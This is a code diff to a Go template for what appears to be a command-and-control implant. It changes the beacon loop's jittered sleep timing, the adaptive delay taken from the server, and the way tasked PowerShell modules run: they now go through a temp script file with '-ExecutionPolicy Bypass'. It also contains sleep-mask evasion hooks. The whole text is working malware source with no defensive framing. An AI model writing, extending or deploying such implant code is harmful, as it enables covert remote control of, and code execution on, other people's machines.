@@ -522,6 +522,7 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strings"
 	"sync"
@@ -538,7 +539,7 @@ const (
 var (
 	sessionID string
 	sessionMu sync.Mutex
-	currentDelay int = delay
+	currentDelay float64 = float64(delay)
 	currentJitter float64 = jitter
 )
 
@@ -596,9 +597,17 @@ func main() {
 	// Beacon loop with adaptive jitter
 	for {
 		beacon()
-		sleepDuration := time.Duration(float64(currentDelay) * (1.0 + currentJitter*(rand.Float64()*2.0-1.0))) * time.Second
+		// Calculate jitter: ±currentJitter% around currentDelay
+		// rand.Float64()*2.0-1.0 gives range [-1.0, 1.0]
+		jitterMultiplier := 1.0 + currentJitter*(rand.Float64()*2.0-1.0)
+		sleepSeconds := currentDelay * jitterMultiplier
+		// Ensure minimum sleep of 0.5 seconds
+		if sleepSeconds < 0.5 {
+			sleepSeconds = 0.5
+		}
+		sleepDuration := time.Duration(sleepSeconds * float64(time.Second))
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] Sleeping for %v before next beacon\n", sleepDuration)
+		fmt.Printf("[DEBUG] Sleeping for %.2fs before next beacon (delay=%.2f, jitter=%.2f%%)\n", sleepSeconds, currentDelay, currentJitter*100)
 		{{end}}
 		{{if .Evasion.SleepMask}}
 		// Sleep mask evasion
@@ -799,7 +808,7 @@ func beacon() {
 		
 		if sleep, ok := response["sleep"].(float64); ok {
 			// Update delay from server response (adaptive sleep)
-			currentDelay = int(sleep)
+			currentDelay = sleep
 			{{if .Debug}}
 			fmt.Printf("[DEBUG] Server sleep interval: %.2f seconds\n", sleep)
 			{{end}}
@@ -955,8 +964,28 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 		}
 		
 		// Execute PowerShell script
-		encodedScript := base64.StdEncoding.EncodeToString([]byte(scriptWithParams))
-		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-EncodedCommand", encodedScript)
+		// Use temp file approach to avoid command line length limits
+		tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("ditto_%d.ps1", time.Now().UnixNano()))
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] Writing PowerShell script to temp file: %s\n", tmpFile)
+		{{end}}
+		
+		// Write script to temp file
+		if err := os.WriteFile(tmpFile, []byte(scriptWithParams), 0644); err != nil {
+			sendResult("module", taskID, fmt.Sprintf("Error writing temp file: %v", err))
+			return
+		}
+		
+		// Clean up temp file after execution
+		defer func() {
+			os.Remove(tmpFile)
+			{{if .Debug}}
+			fmt.Printf("[DEBUG] Removed temp file: %s\n", tmpFile)
+			{{end}}
+		}()
+		
+		// Execute PowerShell script file
+		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-File", tmpFile)
 		output, err := cmd.CombinedOutput()
 		
 		if err != nil {
